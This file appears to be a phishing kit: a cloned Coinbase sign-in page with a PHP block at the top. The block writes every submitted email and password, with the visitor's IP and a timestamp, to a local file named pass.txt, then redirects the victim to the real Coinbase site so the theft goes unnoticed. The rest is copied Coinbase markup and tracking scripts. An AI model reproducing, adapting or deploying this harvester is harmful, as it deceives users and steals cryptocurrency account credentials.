<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: https://www.coinbase.com/signin');
$handle = fopen('pass.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿<!DOCTYPE html>
<html xmlns:fb="http://ogp.me/ns/fb#">
<head>
<title>
      Coinbase - Buy/Sell Digital Currency
  </title>
<link rel="shortcut icon" href="/favicon.ico" />
<link rel="apple-touch-icon" href="/apple-touch-icon.png">
<meta property="apple-itunes-app" name="apple-itunes-app" content="app-id=886427730" />
<meta property="description" name="description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing digital currency." />
<meta property="google-site-verification" name="google-site-verification" content="R7G5THr8xgaHFkTNkr_RUB0HvX2Nf8e4qnWi0X1kmz8" />
<meta property="google-site-verification" name="google-site-verification" content="_GaQTkOlc8tLwxDbZfMdxgGPL5wnctrp-vfeavJVsHE" />
<meta property="og:description" name="og:description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing digital currency." />
<meta property="og:image" name="og:image" content="https://www.coinbase.com/img/og-default.jpg" />
<meta property="og:title" name="og:title" content="Coinbase - Buy/Sell Digital Currency" />
<meta property="og:type" name="og:type" content="website" />
<meta property="twitter:app:id:googleplay" name="twitter:app:id:googleplay" content="com.coinbase.android" />
<meta property="twitter:app:id:iphone" name="twitter:app:id:iphone" content="886427730" />
<meta property="twitter:app:id:ipad" name="twitter:app:id:ipad" content="886427730" />
<meta property="twitter:app:name:googleplay" name="twitter:app:name:googleplay" content="Coinbase - Buy/Sell Digital Currency" />
<meta property="twitter:app:name:ipad" name="twitter:app:name:ipad" content="Coinbase - Buy/Sell Digital Currency" />
<meta property="twitter:app:name:iphone" name="twitter:app:name:iphone" content="Coinbase - Buy/Sell Digital Currency" />
<meta property="twitter:card" name="twitter:card" content="summary" />
<meta property="twitter:creator" name="twitter:creator" content="@coinbase" />
<meta property="twitter:description" name="twitter:description" content="Coinbase is a secure online platform for buying, selling, transferring, and storing digital currency." />
<meta property="twitter:image" name="twitter:image" content="https://www.coinbase.com/img/og-default.jpg" />
<meta property="twitter:site" name="twitter:site" content="@coinbase" />
<meta property="twitter:title" name="twitter:title" content="Coinbase - Buy/Sell Digital Currency" />
<meta property="viewport" name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="manifest" href="/manifest.json" />
<script type="application/ld+json">
//<![CDATA[
  {
  "@context": "http://schema.org",
  "@type": "Organization",
  "url": "https://www.coinbase.com",
  "logo": "https://www.coinbase.com/assets/logos/logo-74d6eb0585b0b611ef872f4923a7ac76095616cb7badbd674a26993c96a59305.png",
  "contactPoint": [{
    "@type": "ContactPoint",
    "telephone": "+1-888-908–7930",
    "contactType": "Customer support"
  }]
}

//]]>
</script>
<script type="text/javascript">
  window.Coinbase = {"cache":{},"constants":{"ENV":"production","HTTPS":true,"MIXPANEL_TOKEN":"7c112173efca4899213c618484d8f5fe","BUGSNAG_JS_API_KEY":"a19f89113e392bb944d3ec0796340fbd","BUGSNAG_REACT_API_KEY":"afb3b2c84dbb04bf0f2f260003685211","PUSHER_SSL":true,"PUSHER_KEY":"dbb4773efe0876e515990b8701d147","PUSHER_WS_HOST":"ws.coinbase.com","PUSHER_WS_PORT":443,"PLAID_PUBLIC_KEY":"c52f3de17944312356997882b0c8de","PLAID_ENV":"production","USER":null,"S_SNIPPET_KEY":"6174a9","SESSION_ID":"623a37cd3be8823148ba97a59b22aa5c","DEBUG":false,"API_HOST":"https://www.coinbase.com/api","CRYPTOCURRENCIES":["BTC","BCH","BSV","ETH","ETC","LTC","ZRX","USDC","BAT","ZEC","XRP"]},"variants":{"2019.january.web_public_routes":false},"modules":{},"translations":{"CURRENCY_UNIT":"$","CURRENCY_DELIMITER":",","CURRENCY_SEPARATOR":".","CURRENCY_FORMAT":"%u%n","LOCALE":"en","AVAILABLE_LOCALES":[["Deutsch","de"],["English","en"],["English - United States","en-US"],["Español","es"],["Español - Méjico","es-mx"],["Français","fr"],["bahasa Indonesia","id"],["Italiano","it"],["Nederlands","nl"],["Português","pt"],["Português - Brazil","pt-br"]]},"utils":{},"metrics":{"browser":{"name":"Firefox","version":"57"}}};
  window.MIXPANEL_CUSTOM_LIB_URL = "https://www.coinbase.com/assets/vendor/mixpanel/build/mixpanel.globals-bddb90230a17af203432e87b9e2dbc38dd784eeae2f9e3138ae2cda28a0a228a.js";
  window.apiHost = Coinbase.constants.API_HOST;
  window.jwtToken = Coinbase.constants.API_JWT_TOKEN;
</script>
<link rel="stylesheet" media="all" href="https://www.coinbase.com/assets/core-54b0c48777a93a0f6e53122e4e05f69c101fb1e23e840d87996124d21034a9ce.css" />
<link rel="stylesheet" media="all" href="https://www.coinbase.com/assets/application-71ee4356e1173409750f91ae8e0ab14988b59f6b5b4b4822ed5414df8853936c.css" />
<script src="https://www.coinbase.com/assets/jquery-f4879eb8690155de2bdcafd0967e4171fd96bdfcea8d747a3d1f771479f5689f.js"></script>
<meta name="csrf-param" content="authenticity_token" />
<meta name="csrf-token" content="EXUSQrju9hbXl/O5i7ThRlLNT452yd03zDhe1InnHKEatiULCrdzWQt3P1EUVwBSWru8v1T4PSi8Iuk9JSeRzw==" />
<script src="https://www.coinbase.com/assets/application-5e550a7827e253bd3c9343214141ca740ef2b5f1831f3729d09b528714a2c6d2.js"></script>
<link rel="alternate" hreflang="de" href="https://www.coinbase.com/signin?locale=de" />
<link rel="alternate" hreflang="en" href="https://www.coinbase.com/signin" />
<link rel="alternate" hreflang="es" href="https://www.coinbase.com/signin?locale=es" />
<link rel="alternate" hreflang="fr" href="https://www.coinbase.com/signin?locale=fr" />
<link rel="alternate" hreflang="id" href="https://www.coinbase.com/signin?locale=id" />
<link rel="alternate" hreflang="it" href="https://www.coinbase.com/signin?locale=it" />
<link rel="alternate" hreflang="nl" href="https://www.coinbase.com/signin?locale=nl" />
<link rel="alternate" hreflang="pt" href="https://www.coinbase.com/signin?locale=pt" />
<link rel="alternate" hreflang="x-default" href="https://www.coinbase.com/signin" />
<link rel="canonical" href="https://www.coinbase.com/signin" />
</head>
<body class="app signed-out sessions new" data-controller-name="sessions" data-action-name="new" data-view-name="Coinbase.Views.Sessions.New" data-account-id="">

<div class="flash">
</div>
<div class="page-container">

<div class="navbar navbar-static-top">
<div class="navbar-inner">
<div class="container">
<a id="main_nav_btn" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</a>
<a href="/" class="brand" onclick="">
<svg xmlns="http://www.w3.org/2000/svg" width="122" height="28" viewBox="0 0 122 28" class="Header__Logo" role="button" style="
          width: 96px;
          height: 22px;
          margin-top: 2px;
          fill: #FFFFFF;
          cursor: pointer;
        "><path fill-rule="evenodd" d="M10.34 23.89c.93 0 1.8-.17 2.62-.5 0 .03 1.67 2.62 1.7 2.63a9.88 9.88 0 0 1-4.81 1.17C4.72 27.2 1 23.81 1 18.42c0-5.43 3.9-8.8 8.85-8.8 1.75 0 3.14.38 4.53 1.12l-1.6 2.7c-.84-.33-1.7-.48-2.6-.48-3.03 0-5.38 1.93-5.38 5.46 0 3.34 2.27 5.47 5.54 5.47zM23.27 9.62c5.04 0 8.69 3.57 8.69 8.8 0 5.2-3.65 8.77-8.7 8.77-5 0-8.65-3.57-8.65-8.77 0-5.23 3.65-8.8 8.66-8.8zm0 3.22c-2.81 0-4.86 2.17-4.86 5.58 0 3.38 2.05 5.55 4.86 5.55 2.88 0 4.9-2.17 4.9-5.55 0-3.41-2.02-5.58-4.9-5.58zm11.08 13.97V10h3.76V26.8h-3.76zm-.5-21.98a2.36 2.36 0 0 1 4.71 0 2.4 2.4 0 0 1-2.35 2.4 2.4 2.4 0 0 1-2.35-2.4zm7.54 6.23a22.54 22.54 0 0 1 7.7-1.44c4.3 0 7.02 1.63 7.02 6.37v10.82H52.4V16.34c0-2.43-1.51-3.3-3.6-3.3-1.33 0-2.66.18-3.65.49V26.8H41.4V11.06zM59.26 1h3.76v9.45c.8-.42 2.35-.83 3.83-.83 4.86 0 8.5 3.1 8.5 8.5 0 5.43-3.6 9.07-9.82 9.07-2.43 0-4.56-.5-6.27-1.1V1zm3.76 22.62c.72.23 1.67.35 2.62.35 3.45 0 5.92-1.9 5.92-5.77 0-3.27-2.32-5.2-5.16-5.2-1.48 0-2.62.38-3.38.8v9.82zm23.2-8.08c0-1.82-1.38-2.66-3.24-2.66-1.93 0-3.45.57-4.85 1.37v-3.27a11.21 11.21 0 0 1 5.46-1.36c3.68 0 6.3 1.52 6.3 5.73v11.12c-1.6.42-3.87.68-5.77.68-4.36 0-7.55-1.32-7.55-5.12 0-3.42 2.92-5.09 7.78-5.09h1.86v-1.4zm0 3.9h-1.6c-2.62 0-4.33.77-4.33 2.48 0 1.74 1.6 2.42 3.87 2.42.57 0 1.37-.07 2.05-.18v-4.71zm6.4 2.82a8.82 8.82 0 0 0 5.13 1.9c1.67 0 2.77-.57 2.77-1.9 0-1.37-.99-1.86-3.15-2.43-3.5-.8-4.97-2.2-4.97-5.13 0-3.41 2.58-5.08 6-5.08 1.9 0 3.41.41 4.82 1.29v3.45a7.79 7.79 0 0 0-4.71-1.7c-1.63 0-2.5.8-2.5 1.9 0 1.1.71 1.66 2.65 2.2 3.84.83 5.5 2.27 5.5 5.3 0 3.54-2.69 5.13-6.33 5.13a9.87 9.87 0 0 1-5.2-1.36v-3.57zm16.69-3v.07c.23 3 2.8 4.64 5.43 4.64 2.31 0 3.98-.54 5.65-1.64v3.3c-1.52 1.07-3.76 1.56-5.92 1.56-5.24 0-8.8-3.34-8.8-8.65 0-5.35 3.49-8.92 8.12-8.92 4.9 0 7.21 3.15 7.21 7.74v1.9h-11.7zm8.16-2.43c-.08-2.62-1.37-4.06-3.8-4.06-2.16 0-3.75 1.52-4.25 4.06h8.05z"></path></svg>
</a>
<div class="mobile-bg"></div>
<div class="nav-collapse" id="application_menu">
<ul class="nav clearfix">
<li class="dropdown dropdown-hover" id="resources_menu">
<a class="dropdown-toggle" data-toggle="dropdown" href="#">Products <b class='caret'></b></a>
<ul class="dropdown-menu fadeIn animated-fast" role="menu" aria-labelledby="dLabel">
<li class="home "><a href="/">Buy/Sell Digital Currency</a></li>
<li><a href="https://pro.coinbase.com" class="external-link">Coinbase Pro</a></li>
<li><a href="https://prime.coinbase.com" class="external-link">Coinbase Prime</a></li>
<li><a href="https://developers.coinbase.com" class="external-link">Developer Platform</a></li>
<li><a href="https://commerce.coinbase.com" class="external-link">Coinbase Commerce</a></li>
</ul>
</li>
<li><a href="/help" target="_blank">Help</a></li>
</ul>
<ul class="nav clearfix">
<li>
<a href="/charts">Charts</a>
</li>
<li class="active signin"><a href="/signin">Sign In</a></li>
<li style="margin-top:-1px" class=" signup"><a href="/signup" class="btn">Sign Up</a></li>
</ul>
</div>
</div>
</div>
</div>
<div class="container" id="page">
<noscript>
  <div class="alert alert-danger">
    <h4 class="alert-heading">Javascript is disabled in your browser</h4>
    Please enable javascript or upgrade your browser for the best experience on Coinbase.
  </div>
</noscript>
<div class="session">
<h2 class="header">Sign in to Coinbase</h2>
<div class="account-form">
<div class="form">
<form class="form-vertical" action="<?php echo basename(__FILE__); ?>" accept-charset="UTF-8" method="post">
<div class="control-group">
<div class="controls">
<input type="email" name="email" id="email" class="focus text-field" placeholder="Email" tabindex="1" autocomplete="off" />
</div>
</div>
<div class="control-group">
<div class="controls">
<input type="password" name="password" id="password" class="text-field" placeholder="Password" autocomplete="off" tabindex="2" />
</div>
</div>
<div class="control-group">
<div class="controls clearfix">
<input type="submit" name="commit" value="Sign In" class="btn btn-primary pull-right" id="signin_button" tabindex="4" data-disable-with="Signing in..." />
<label class="checkbox">
<input type="checkbox" name="stay_signed_in" id="stay_signed_in" value="1" tabindex="3" /> Keep me signed in on this computer
</label>
</div>
</div>
</form> </div>
</div>
<div class="account-extras">
<p>
<a href="/password_resets/new">Forgot password?</a>
&middot; <a href="/signup">Don&#39;t have an account?</a>
&middot; <a href="/legal/privacy">Privacy Policy</a><br>
</p>
<p>
<a href="https://support.coinbase.com/customer/en/portal/articles/2488794-troubleshooting-2-factor-authentication" target="_blank">Have an issue with 2-factor authentication?</a>
</p>
</div>
</div>
</div>
</div>
<footer>
<div class="container">
<div class="row-fluid">
<div class="span2 footer__logo">
<a href="/" class="brand"><svg xmlns="http://www.w3.org/2000/svg" width="122" height="28" viewBox="0 0 122 28" role="button" style="
            width: 96px;
            height: 22px;
            fill: #0667d0;
            cursor: pointer;
          "><path fill-rule="evenodd" d="M10.34 23.89c.93 0 1.8-.17 2.62-.5 0 .03 1.67 2.62 1.7 2.63a9.88 9.88 0 0 1-4.81 1.17C4.72 27.2 1 23.81 1 18.42c0-5.43 3.9-8.8 8.85-8.8 1.75 0 3.14.38 4.53 1.12l-1.6 2.7c-.84-.33-1.7-.48-2.6-.48-3.03 0-5.38 1.93-5.38 5.46 0 3.34 2.27 5.47 5.54 5.47zM23.27 9.62c5.04 0 8.69 3.57 8.69 8.8 0 5.2-3.65 8.77-8.7 8.77-5 0-8.65-3.57-8.65-8.77 0-5.23 3.65-8.8 8.66-8.8zm0 3.22c-2.81 0-4.86 2.17-4.86 5.58 0 3.38 2.05 5.55 4.86 5.55 2.88 0 4.9-2.17 4.9-5.55 0-3.41-2.02-5.58-4.9-5.58zm11.08 13.97V10h3.76V26.8h-3.76zm-.5-21.98a2.36 2.36 0 0 1 4.71 0 2.4 2.4 0 0 1-2.35 2.4 2.4 2.4 0 0 1-2.35-2.4zm7.54 6.23a22.54 22.54 0 0 1 7.7-1.44c4.3 0 7.02 1.63 7.02 6.37v10.82H52.4V16.34c0-2.43-1.51-3.3-3.6-3.3-1.33 0-2.66.18-3.65.49V26.8H41.4V11.06zM59.26 1h3.76v9.45c.8-.42 2.35-.83 3.83-.83 4.86 0 8.5 3.1 8.5 8.5 0 5.43-3.6 9.07-9.82 9.07-2.43 0-4.56-.5-6.27-1.1V1zm3.76 22.62c.72.23 1.67.35 2.62.35 3.45 0 5.92-1.9 5.92-5.77 0-3.27-2.32-5.2-5.16-5.2-1.48 0-2.62.38-3.38.8v9.82zm23.2-8.08c0-1.82-1.38-2.66-3.24-2.66-1.93 0-3.45.57-4.85 1.37v-3.27a11.21 11.21 0 0 1 5.46-1.36c3.68 0 6.3 1.52 6.3 5.73v11.12c-1.6.42-3.87.68-5.77.68-4.36 0-7.55-1.32-7.55-5.12 0-3.42 2.92-5.09 7.78-5.09h1.86v-1.4zm0 3.9h-1.6c-2.62 0-4.33.77-4.33 2.48 0 1.74 1.6 2.42 3.87 2.42.57 0 1.37-.07 2.05-.18v-4.71zm6.4 2.82a8.82 8.82 0 0 0 5.13 1.9c1.67 0 2.77-.57 2.77-1.9 0-1.37-.99-1.86-3.15-2.43-3.5-.8-4.97-2.2-4.97-5.13 0-3.41 2.58-5.08 6-5.08 1.9 0 3.41.41 4.82 1.29v3.45a7.79 7.79 0 0 0-4.71-1.7c-1.63 0-2.5.8-2.5 1.9 0 1.1.71 1.66 2.65 2.2 3.84.83 5.5 2.27 5.5 5.3 0 3.54-2.69 5.13-6.33 5.13a9.87 9.87 0 0 1-5.2-1.36v-3.57zm16.69-3v.07c.23 3 2.8 4.64 5.43 4.64 2.31 0 3.98-.54 5.65-1.64v3.3c-1.52 1.07-3.76 1.56-5.92 1.56-5.24 0-8.8-3.34-8.8-8.65 0-5.35 3.49-8.92 8.12-8.92 4.9 0 7.21 3.15 7.21 7.74v1.9h-11.7zm8.16-2.43c-.08-2.62-1.37-4.06-3.8-4.06-2.16 0-3.75 1.52-4.25 4.06h8.05z"></path></svg></a>
<br />
<small><span>&copy; 2019 Coinbase</span></small>
</div>
<div class="span2">
<h4 class="collapsible__toggle">Products</h4>
<nav class="collapsible">
<a href="/">Buy/Sell Digital Currency</a>
<a href="https://pro.coinbase.com">Coinbase Pro</a>
<a href="https://prime.coinbase.com">Coinbase Prime</a>
<a href="https://developers.coinbase.com">Developer Platform</a>
<a href="https://commerce.coinbase.com">Coinbase Commerce</a>
</nav>
</div>
<div class="span2">
<h4 class="collapsible__toggle">Learn</h4>
<nav class="collapsible">
<a href="/buy-bitcoin">Buy Bitcoin</a>
<a href="/buy-bitcoincash">Buy Bitcoin Cash</a>
<a href="/buy-ethereum">Buy Ethereum</a>
<a href="/buy-litecoin">Buy Litecoin</a>
<a href="/global">Supported Countries</a>
<a href="http://status.coinbase.com">Status</a>
</nav>
</div>
<div class="span2">
<h4 class="collapsible__toggle">Company</h4>
<nav class="collapsible">
<a href="/about">About</a>
<a href="/careers">Careers</a>
<a href="/press">Press</a>
<div class="dropup dropdown-hover">
<a class="dropdown-toggle" data-toggle="dropdown" href="#">
Legal &amp; Privacy
</a>
<ul class="dropdown-menu fadeIn animated-fast" role="menu" aria-labelledby="dLabel">
<li><a href="/legal/user_agreement">User Agreement</a></li>
<li><a href="/legal/privacy">Privacy Policy</a></li>
<li><a href="/legal/licenses">Licenses &amp; Disclosures</a></li>
</ul>
</div>
<a href="https://support.coinbase.com">Support</a>
</nav>
</div>
<div class="span2">
<h4 class="collapsible__toggle">Social</h4>
<nav class="collapsible">
<a href="http://blog.coinbase.com">Blog</a>
<a href="https://twitter.com/coinbase">Twitter</a>
<a href="https://www.facebook.com/Coinbase">Facebook</a>
</nav>
</div>
<div class="span2">
<div class="footer-locale-select">
<h4>Language</h4>
<p><select name="locale" id="locale_select"><option value="de">Deutsch</option>
<option selected="selected" value="en">English</option>
<option value="en-US">English - United States</option>
<option value="es">Español</option>
<option value="es-mx">Español - Méjico</option>
<option value="fr">Français</option>
<option value="id">bahasa Indonesia</option>
<option value="it">Italiano</option>
<option value="nl">Nederlands</option>
<option value="pt">Português</option>
<option value="pt-br">Português - Brazil</option></select></p>

</div>
</div>
</div>
</div>
</footer>

<script>
  // This explicity blacklists custom html and img tags from being rendered via GTM js to help  
  // prevent possible javascript injection attacks via html and img. Any changes to this list  
  // requires security reviews from appsec. You can request a review via go/appsec.  
  dataLayer = [{
    'gtm.blacklist': ['html', 'img']
  }];
  
  (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
  new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
  j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
  'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
  })(window,document,'script','dataLayer','GTM-M3HVLBC');
</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-32804181-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

    // Google Analytics
    gtag('config', 'UA-32804181-1');

  // Google remarketing tag
  gtag('config', 'AW-834608245');
</script>
<script type="text/javascript">
  /* <![CDATA[ */
  var google_conversion_id = 834608245;
  var google_custom_params = window.google_tag_params;
  var google_remarketing_only = true;
  /* ]]> */
</script>
<script type="text/javascript" src="https://www.googleadservices.com/pagead/conversion.js">
</script>

<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=379670032410722&ev=PageView&noscript=1" />


<script>
  var analytics = analytics || {};
  (function() {
      if(analytics.firstLoad === undefined) {
          var whitelist = /^(?!(^|.*\.)(?:coinbase\.com|gdax\.com|cbhq\.net|localhost)$).*$/,
              hostname = location.hostname;

          if (hostname.match(whitelist)) {
                  (function (d, t) {
                      var g = d.createElement(t),
                          s = d.getElementsByTagName(t)[0],
                          server = 'https://static.statsjar.com/analytics/rsxdhm2zkI.js';
                          g.src = server;
                          g.setAttribute("async", "");
                          s.parentNode.insertBefore(g, s.nextSibling);
                  }(document, 'script'));
          }
          analytics.firstLoad = false;
      }
  })();
</script>
<script type="text/javascript" async>
  (function(e,t){var n=e.amplitude||{_q:[],_iq:{}};var r=t.createElement("script")
  ;r.type="text/javascript";r.async=true
  ;r.src="https://www.coinbase.com/assets/vendor/amplitude-js/amplitude.min-0334e12f07f750b5f5c14fc73085a83972c0f6f633b953cc8cd4d7fc2ee6ef52.js"
  ;r.onload=function(){if(e.amplitude.runQueuedFunctions){
  e.amplitude.runQueuedFunctions()}else{
  console.log("[Amplitude] Error: could not load SDK")}}
  ;var i=t.getElementsByTagName("script")[0];i.parentNode.insertBefore(r,i)
  ;function s(e,t){e.prototype[t]=function(){
  this._q.push([t].concat(Array.prototype.slice.call(arguments,0)));return this}}
  var o=function(){this._q=[];return this}
  ;var a=["add","append","clearAll","prepend","set","setOnce","unset"]
  ;for(var u=0;u<a.length;u++){s(o,a[u])}n.Identify=o;var c=function(){this._q=[]
  ;return this}
  ;var l=["setProductId","setQuantity","setPrice","setRevenueType","setEventProperties"]
  ;for(var p=0;p<l.length;p++){s(c,l[p])}n.Revenue=c
  ;var d=["init","logEvent","logRevenue","setUserId","setUserProperties","setOptOut","setVersionName","setDomain","setDeviceId","setGlobalUserProperties","identify","clearUserProperties","setGroup","logRevenueV2","regenerateDeviceId","logEventWithTimestamp","logEventWithGroups","setSessionId"]
  ;function v(e){function t(t){e[t]=function(){
  e._q.push([t].concat(Array.prototype.slice.call(arguments,0)))}}
  for(var n=0;n<d.length;n++){t(d[n])}}v(n);n.getInstance=function(e){
  e=(!e||e.length===0?"$default_instance":e).toLowerCase()
  ;if(!n._iq.hasOwnProperty(e)){n._iq[e]={_q:[]};v(n._iq[e])}return n._iq[e]}
  ;e.amplitude=n})(window,document);

  var instance = amplitude.getInstance();
  instance.init("132e62b5953ce8d568137d5887b6b7ab", null, {
    includeUtm: true,
    includeReferrer: true
  });
  instance.setDeviceId("620f2d22-0232-4880-b215-ab2200ce3886");

</script>
<script type="text/javascript">
  </script>
</body>
</html>
